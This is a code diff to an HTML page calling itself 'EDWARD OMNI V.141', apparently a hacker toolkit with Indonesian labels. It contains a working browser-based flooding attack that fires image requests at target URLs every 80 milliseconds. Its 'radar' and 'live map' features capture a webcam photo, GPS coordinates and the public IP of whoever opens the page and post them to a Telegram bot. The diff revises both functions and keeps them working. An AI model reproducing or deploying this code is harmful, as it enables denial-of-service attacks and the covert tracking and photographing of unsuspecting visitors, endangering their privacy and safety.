@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.140</title>
+    <title>EDWARD OMNI V.141</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; }
@@ -20,54 +20,56 @@
         .btn-map { background: var(--neon); color: #000; }
         .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; font-size: 10px; }
         .mon-box { border: 1px solid rgba(0,255,136,0.2); padding: 5px; border-radius: 5px; text-align: center; color: var(--neon); }
-        #scanStatus { display: none; margin-top: 10px; text-align: center; color: var(--neon); font-weight: bold; }
         #killerLog { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
         #mapBox { display: none; width: 100%; height: 200px; border-radius: 15px; border: 1px solid var(--neon); margin-top: 10px; }
+        
+        /* RADAR OVERLAY & EXIT BUTTON */
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-container { width: 120px; height: 120px; border-radius: 50%; border: 1px solid var(--neon); position: relative; overflow: hidden; }
+        .radar-container { width: 150px; height: 150px; border-radius: 50%; border: 1px solid var(--neon); position: relative; overflow: hidden; margin-bottom: 20px; }
         .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
+        .btn-exit { background: var(--red); color: white; padding: 10px 25px; border-radius: 50px; font-size: 10px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 15px var(--red); }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         canvas, video { display: none; }
     </style>
 </head>
 <body>
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.140</p>
+        <p class="master-name">EDWARD OMNI V.141</p>
         <div class="sys-monitor">
             <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
-            <div class="mon-box :">TEMP: <span id="sysTemp">38°C</span></div>
+            <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
         </div>
     </div>
 
     <div class="card">
         <h3>🛡️ DEEP CLOUD SCANNER</h3>
         <input type="text" id="scanInput" placeholder="Cek Link...">
-        <button class="btn btn-scan" onclick="cekLink()">⚡ SCAN LINK</button>
-        <div id="scanStatus"></div>
+        <button class="btn btn-scan" onclick="alert('Scan Aktif')">⚡ SCAN LINK</button>
     </div>
 
     <div class="card">
-        <h3>🔥 NUCLEAR GACOR (IMAGE-FLOOD)</h3>
-        <input type="text" id="target1" placeholder="Link Target 1">
-        <input type="text" id="target2" placeholder="Link Target 2">
-        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
+        <h3>🔥 NUCLEAR BRUTAL (V.141)</h3>
+        <input type="text" id="target1" placeholder="Target 1">
+        <input type="text" id="target2" placeholder="Target 2">
+        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH NUCLEAR 🚀</button>
         <div id="killerLog"></div>
     </div>
 
     <div class="card">
         <h3>📡 SATELIT RADAR</h3>
-        <button class="btn btn-radar" onclick="startRadar()">KIRIM DATA (FOTO + IP + GPS)</button>
+        <button class="btn btn-radar" onclick="startRadar()">KIRIM DATA (FOTO+GPS)</button>
     </div>
 
     <div class="card">
-        <h3>📍 MAPS SATELIT</h3>
-        <button class="btn btn-map" onclick="showLiveMap()">LOCK GPS & KIRIM DATA</button>
+        <h3>📍 LIVE MAP SATELIT</h3>
+        <button class="btn btn-map" onclick="showLiveMap()">LOCK GPS & VIEW MAP</button>
         <iframe id="mapBox" src="" frameborder="0"></iframe>
     </div>
 
     <div id="radarOverlay">
         <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">V.140 SENDING DATA...</p>
+        <p id="radarStatus" style="font-size:10px; color:var(--neon); letter-spacing:2px; margin-bottom:20px;">V.141 SENDING DATA...</p>
+        <button class="btn-exit" onclick="abortRadar()">[ ABORT ]</button>
     </div>
 
     <canvas id="canvas"></canvas><video id="v" autoplay playsinline></video>
@@ -77,29 +79,17 @@
         const CHAT_ID = '7898572558';
         let isAtk = false;
 
-        function cekLink() {
-            const status = document.getElementById('scanStatus');
-            status.style.display = "block"; status.innerText = "ANALYZING...";
-            setTimeout(() => { status.innerText = "✅ ANALYSIS COMPLETE"; }, 1000);
-        }
-
         function toggleAtk() {
             const t1 = document.getElementById('target1').value;
-            const t2 = document.getElementById('target2').value;
             const log = document.getElementById('killerLog');
             if(!t1 || isAtk) { if(isAtk) location.reload(); return; }
             isAtk = true; log.style.display = "block";
             document.getElementById('atkBtn').innerText = "TERMINATE 🛑";
-            [t1, t2].forEach(url => {
-                if(!url) return;
-                for(let i=0; i<30; i++) {
-                    setInterval(() => {
-                        const img = new Image(); img.src = url + "/?v=" + Math.random();
-                        const e = document.createElement('div'); e.innerText = "> [V140] HIT -> " + url.substring(0,12);
-                        log.prepend(e); if(log.childNodes.length > 10) log.removeChild(log.lastChild);
-                    }, 80);
-                }
-            });
+            setInterval(() => {
+                const img = new Image(); img.src = t1 + "/?v=" + Math.random();
+                const e = document.createElement('div'); e.innerText = "> [BRUTAL] HIT -> " + t1.substring(0,12);
+                log.prepend(e); if(log.childNodes.length > 10) log.removeChild(log.lastChild);
+            }, 80);
         }
 
         async function startRadar() {
@@ -115,36 +105,36 @@
                         const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                         const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
                         await sendTele(blob, ipD.ip, pos.coords.latitude, pos.coords.longitude, "RADAR");
-                        document.getElementById('radarOverlay').style.display = 'none';
-                        alert("FOTO & LOKASI TERKIRIM!");
+                        abortRadar();
+                        alert("DATA TERKIRIM!");
                     }, 3000);
-                }, () => { location.reload(); }, {enableHighAccuracy: true});
-            } catch (e) { location.reload(); }
+                }, () => { abortRadar(); }, {enableHighAccuracy: true, timeout: 8000});
+            } catch (e) { abortRadar(); }
         }
 
         function showLiveMap() {
             document.getElementById('radarOverlay').style.display = 'flex';
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude; const lon = pos.coords.longitude;
                 const map = document.getElementById('mapBox');
-                map.src = "https://maps.google.com/maps?q="+lat+","+lon+"&z=15&output=embed";
+                map.src = "https://maps.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude+"&z=15&output=embed";
                 map.style.display = "block";
-                
                 const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
-                await sendTele(null, ipD.ip, lat, lon, "MAPS-ONLY");
-                
-                document.getElementById('radarOverlay').style.display = 'none';
-                alert("KOORDINAT GPS TERKIRIM!");
-            }, () => { location.reload(); }, {enableHighAccuracy: true});
+                await sendTele(null, ipD.ip, pos.coords.latitude, pos.coords.longitude, "MAPS");
+                abortRadar();
+            }, () => { abortRadar(); }, {enableHighAccuracy: true, timeout: 8000});
+        }
+
+        function abortRadar() {
+            document.getElementById('radarOverlay').style.display = 'none';
+            const v = document.getElementById('v');
+            if(v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
         }
 
         async function sendTele(photo, ip, lat, lon, source) {
             const fd = new FormData(); fd.append('chat_id', CHAT_ID);
-            let cap = "🔱 [ REPORT V.140 - "+source+" ] 🔱\n🌐 IP: "+ip+"\n📍 MAP: https://www.google.com/maps?q="+lat+","+lon;
-            
+            let cap = "🔱 [ V.141 - "+source+" ] 🔱\n🌐 IP: "+ip+"\n📍 MAP: https://www.google.com/maps?q="+lat+","+lon;
             if(photo) {
-                fd.append('photo', photo);
-                fd.append('caption', cap);
+                fd.append('photo', photo); fd.append('caption', cap);
                 return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
             } else {
                 fd.append('text', cap);
